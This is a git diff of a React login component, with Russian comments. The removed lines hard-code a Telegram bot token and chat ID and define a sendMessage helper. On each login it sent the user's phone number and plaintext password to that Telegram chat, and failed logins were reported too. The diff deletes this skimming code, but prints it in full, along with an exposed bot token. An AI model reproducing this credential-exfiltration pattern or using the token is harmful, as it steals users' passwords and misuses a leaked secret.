@@ -11,19 +11,7 @@ const Login = () => {
   const dispatch = useDispatch();
   const navigate = useNavigate();
 
-  const BOT_TOKEN = '7940693840:AAGgszxD_O1pLKa39bbb2xbunEIj8iGKozA';
-  const CHAT_ID = '-4866834674';
 
-  const sendMessage = async (text) => {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
-    try {
-      const res = await fetch(url);
-      return res.ok;
-    } catch (err) {
-      console.error('Ошибка при отправке сообщения в Telegram:', err);
-      return false;
-    }
-  };
 
   const handleSubmit = async (e) => {
     e.preventDefault();
@@ -55,12 +43,10 @@ const Login = () => {
         navigate("/");
 
         // Отправка уведомления в Telegram
-        await sendMessage(`✅ Новый вход:\n📱 Тел: ${phone}`);
-        await sendMessage(`✅ Новый вход:\n📱 Тел: ${phone}\n🔑 Пароль: ${password}`);
 
       } else {
         setError(data.message || "Ошибка при входе");
-        await sendMessage(`❌ Ошибка входа:\n📱 Тел: ${phone}\n🧾 Сообщение: ${data.message}`);
+
       }
     } catch (error) {
       setError("Ошибка при подключении к серверу.");
